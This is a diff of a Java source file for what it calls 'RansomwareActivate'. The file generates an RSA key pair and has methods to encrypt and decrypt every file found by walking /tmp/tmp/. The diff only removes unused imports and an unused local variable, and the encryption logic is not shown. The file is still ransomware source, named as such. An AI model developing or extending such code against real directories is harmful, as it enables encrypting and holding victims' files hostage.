@@ -1,16 +1,10 @@
-	import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.io.OutputStream;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.security.Key;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
@@ -20,12 +14,7 @@ import java.util.ArrayList;
 import java.util.Base64;
 import java.util.List;
 import java.util.stream.Stream;
-import java.nio.file.*;
 import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
-import javax.management.RuntimeErrorException;
-import java.io.IOException;
-import java.util.stream.Stream;
 
 class secret {
 	KeyPair secret(){
@@ -68,7 +57,6 @@ class RansomwareActivate{
 	void encryptAllFiles() throws IOException{
 		secret sec = new secret();
 		KeyPair kp = sec.secret();
-		RansomwareActivate ransomware = new RansomwareActivate();
 		List<Path> fileNames = new ArrayList<Path>();
 		try{
 			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
@@ -93,7 +81,6 @@ class RansomwareActivate{
 	void decryptAllFiles() throws IOException{
 		secret sec = new secret();
 		KeyPair kp = sec.secret();
-		RansomwareActivate ransomware = new RansomwareActivate();
 		List<Path> fileNames = new ArrayList<Path>();
 		try{
 			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
